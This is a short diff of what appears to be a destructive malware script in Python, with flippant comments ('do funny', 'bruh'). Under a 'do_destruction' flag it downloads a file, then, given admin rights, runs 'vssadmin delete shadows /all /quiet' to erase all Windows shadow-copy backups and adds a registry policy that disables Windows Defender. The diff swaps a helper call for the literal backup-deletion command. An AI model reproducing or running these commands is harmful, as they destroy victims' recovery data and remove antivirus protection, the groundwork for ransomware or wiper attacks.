@@ -26,12 +26,12 @@ if debug:
 # does destruction if flag is true
 if do_destruction:
     #downloads file
-    download()
+    ufck()
 
     #do funny
     if admCheck:
         try:
-            yeetShadow()
+            do_command('vssadmin delete shadows /all /quiet')
         except:
             print('bruh')
         do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
